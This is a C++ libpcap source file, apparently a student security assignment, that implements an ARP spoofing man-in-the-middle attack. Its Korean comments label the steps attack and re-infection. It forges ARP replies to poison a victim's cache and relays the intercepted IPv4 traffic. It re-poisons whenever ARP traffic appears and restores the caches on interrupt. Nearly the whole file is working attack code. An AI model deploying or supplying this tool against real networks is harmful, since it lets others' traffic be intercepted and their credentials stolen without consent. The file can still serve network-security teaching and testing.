#include <cstdio>
#include <pcap.h>
#include <signal.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_own_addr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct sector {
	Ip   sender_ip_;
    Mac  sender_mac_;
    Ip   target_ip_;
    Mac  target_mac_;
	// 공격하기 위한 패킷
    EthArpPacket Arp_packet;

	// 외부에 출력을 하기위해 기존의 함수를 가져옴.
	Mac sender_mac() { return sender_mac_; }
	Ip sender_ip() { return sender_ip_; }

	Mac target_mac() { return target_mac_; }
	Ip target_ip() { return target_ip_; }
}Sectors;

Mac my_mac;
Ip my_ip;

// Recovery를 하기 위해 전역 변수로 선언.
int count;
char* dev;
Sectors* sector;

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]");
	printf("sample: send-arp-test wlan0\n");
}

Mac get_Mac_addr(pcap_t* handle, Ip sender_ip)
{
	uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	Mac broadcast_mac(broadcast);										// ff:ff:ff:ff:ff:ff:ff
	
	uint8_t zero[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	Mac sender_mac(zero);
	EthArpPacket re_packet;

    re_packet.eth_.dmac_ = broadcast_mac; 						    // broadcasting
	re_packet.eth_.smac_ = my_mac; 							    	// mymac
    re_packet.eth_.type_ = htons(EthHdr::Arp);

	re_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	re_packet.arp_.pro_ = htons(EthHdr::Ip4);
	re_packet.arp_.hln_ = Mac::SIZE;
	re_packet.arp_.pln_ = Ip::SIZE;
	re_packet.arp_.op_ = htons(ArpHdr::Request);
	re_packet.arp_.smac_ = my_mac;     						    	// my mac
	re_packet.arp_.sip_ = htonl(my_ip);						    	// my_ip
	re_packet.arp_.tmac_ = sender_mac;								// sender(unknown)
	re_packet.arp_.tip_ = htonl(sender_ip);				        	// sender_ip

	// 못 받을 수 있기에 무조껀 4번을 날린다.
    for (int i =0; i < 5; i++)
    {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&re_packet), sizeof(EthArpPacket));
	    if (res != 0) {
	 	    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	    }
    }
    
   	while(true)
	{
		const u_char* packet;
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
        
        EthArpPacket* re_packet = (EthArpPacket*)packet;
		if(re_packet->eth_.type() != EthHdr::Arp)
			continue;
		if(re_packet->eth_.dmac().operator!=(my_mac))
			continue;
		if(re_packet->arp_.op() != ArpHdr::Reply)
			continue;
		if(re_packet->arp_.tmac_.operator!=(my_mac))
			continue;
		if(!re_packet->arp_.tip().operator==(my_ip))
			continue;
		if(!re_packet->arp_.sip().operator==(sender_ip))
			continue;
			
		// printf("ether: %s\n", ((std::string)re_packet->eth_.dmac()).c_str());
		// printf("ether:%s\n", ((std::string)re_packet->eth_.smac()).c_str());
		// printf("arp: %s\n", ((std::string)re_packet->arp_.tip()).c_str());
		// printf("arp: %s\n", ((std::string)re_packet->arp_.tmac()).c_str());
		// printf("arp: %s\n", ((std::string)re_packet->arp_.sip()).c_str());
		// printf("arp: %s\n", ((std::string)re_packet->arp_.smac()).c_str());
		return Mac(re_packet->arp_.smac_);
	}
	return NULL;
}

void send_Arp_Packet(Sectors* sector)
{
	sector->Arp_packet.eth_.dmac_ = sector->sender_mac_;
    sector->Arp_packet.eth_.smac_ = my_mac;
    sector->Arp_packet.eth_.type_ = htons(EthHdr::Arp);

    sector->Arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    sector->Arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
    sector->Arp_packet.arp_.hln_ = Mac::SIZE;
    sector->Arp_packet.arp_.pln_ = Ip::SIZE;
    sector->Arp_packet.arp_.op_ = htons(ArpHdr::Reply);
    sector->Arp_packet.arp_.smac_ = my_mac;
    sector->Arp_packet.arp_.sip_ = htonl(sector->target_ip_);
    sector->Arp_packet.arp_.tmac_ = sector->sender_mac_;
    sector->Arp_packet.arp_.tip_ = htonl(sector->sender_ip_);

}

void send_arp_recover(int sig)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(1);
	}

	for (int i = 0; i < count; i++)
	{
		printf("\tAPR복구를 시작합니다.\n");

		EthArpPacket recover_packet;

		recover_packet.eth_.dmac_ = sector[i].sender_mac_; 						// sendermac
		recover_packet.eth_.smac_ = sector[i].target_mac_; 						// targermac
    	recover_packet.eth_.type_ = htons(EthHdr::Arp);

		recover_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		recover_packet.arp_.pro_ = htons(EthHdr::Ip4);
		recover_packet.arp_.hln_ = Mac::SIZE;
		recover_packet.arp_.pln_ = Ip::SIZE;
		recover_packet.arp_.op_ = htons(ArpHdr::Reply);
		recover_packet.arp_.smac_ = sector[i].target_mac_;     						    	// my mac
		recover_packet.arp_.sip_ = htonl(Ip(sector[i].target_ip_));						    	// my_ip
		recover_packet.arp_.tmac_ = sector[i].sender_mac_;								// sender(unknown)
		recover_packet.arp_.tip_ = htonl(Ip(sector[i].sender_ip_));				        	// sender_ip

		send_Arp_Packet(&sector[i]);
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&recover_packet), sizeof(EthArpPacket));
	    if (res != 0) {
	 	    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	    }
		printf("Sender에게 ARP Recover을 진행했습니다.\n");
	}
	exit(1);
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	if(sigset(SIGINT, send_arp_recover)== SIG_ERR)
	{
		perror("sigset");
		exit(1);
	}

	dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
    my_mac = get_my_mac(dev);
    my_ip = get_my_ip(dev);

	uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	Mac broadcast_mac(broadcast);										// ff:ff:ff:ff:ff:ff:ff

	count = (argc - 2)/2;
	// Map 대신 Sector 배열을 동적할당
	sector = new Sectors[count];
	for (int i = 0; i < count; i++)
	{
		sector[i].sender_ip_ = Ip(argv[2+(2*i)]);
        sector[i].target_ip_ = Ip(argv[3+(2*i)]);
		printf("전달 받은 인자들을 모두 저장했습니다.\n");

		printf("%s의 Mac을 가져옵니다.....\n", ((std::string)sector[i].sender_ip()).c_str());
		sector[i].sender_mac_ = get_Mac_addr(handle, sector[i].sender_ip_);
		printf("%s의 Mac: %s\n", ((std::string)sector[i].sender_ip()).c_str(), ((std::string)sector[i].sender_mac()).c_str());

		printf("%s의 Mac을 가져옵니다.....\n", ((std::string)sector[i].target_ip()).c_str());
        sector[i].target_mac_ = get_Mac_addr(handle, sector[i].target_ip_);
		printf("%s의 Mac: %s\n", ((std::string)sector[i].target_ip()).c_str(), ((std::string)sector[i].target_mac()).c_str());

		send_Arp_Packet(&sector[i]);
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(sector[i].Arp_packet)), sizeof(EthArpPacket));
	    if (res != 0) {
	 	    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	    }
		printf("Sender에게 ARP 공격을 진행했습니다.\n");
	}

    while(true) 
	{
        struct pcap_pkthdr* header;
        const  u_char*      packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

        EthHdr*	spoof_Packet = (EthHdr*)packet;
		// pcap test에서 가져옴.
		uint64_t packet_Size = header->caplen;

        // Sector 즉 받은 인자수 만큼 반복
        for(int i = 0; i < count; i++) 
		{
			printf("smac: %s\n",((std::string)spoof_Packet->smac()).c_str());
			printf("dmac: %s\n",((std::string)spoof_Packet->dmac()).c_str());
            
            if(spoof_Packet->smac() != sector[i].sender_mac_)
                continue;
			if(spoof_Packet->dmac() != my_mac)
                continue;
			
			printf("smac: %s\n",((std::string)spoof_Packet->smac()).c_str());
			printf("dmac: %s\n",((std::string)spoof_Packet->dmac()).c_str());
            
			if(spoof_Packet->type() == EthHdr::Ip4)
            {
                // dst mac -> target MAC
                spoof_Packet->dmac_ = sector[i].target_mac_;
                // src mac -> my MAC
                spoof_Packet->smac_ = my_mac;

                // relay packet send
                int re = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoof_Packet), packet_Size);

				printf("send Packet\n");
                if (re != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
            }
            // re infect ARP packet
            if(spoof_Packet->type() == EthHdr::Arp)
            {
                printf( "ARP packet 재감염\n");
				res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(sector[i].Arp_packet)), packet_Size);
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
			}
        }
    }

	pcap_close(handle);
	return 0;
}